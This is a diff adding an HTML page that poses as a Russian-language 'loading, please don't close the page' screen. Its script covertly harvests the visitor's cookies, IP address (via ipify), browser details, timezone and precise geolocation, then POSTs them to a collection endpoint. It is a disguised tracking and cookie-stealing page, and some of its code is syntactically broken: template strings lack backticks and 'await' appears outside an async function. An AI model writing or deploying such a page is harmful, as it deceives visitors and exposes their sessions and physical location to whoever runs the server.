@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #00ff00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h3>Подождите, идёт загрузка...</h3>
+        <p style="font-size:12px;color:#666;">Пожалуйста, не закрывайте страницу</p>
+    </div>
+
+    <script>
+        function sendToServer(data) {
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => console.log('send error', e));
+        }
+        
+        function collectAndSend() {
+            let data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || "прямой переход",
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: ${screen.width}x${screen.height},
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ip: await (await fetch('https://api.ipify.org?format=json')).json().ip
+            };
+            
+            // Попытка получить точную геолокацию
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    data.location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}
+                    };
+                    sendToServer(data);
+                });
+            } else {
+                sendToServer(data);
+            }
+        }
+        
+        setTimeout(collectAndSend, 1000);
+    </script>
+</body>
+</html>
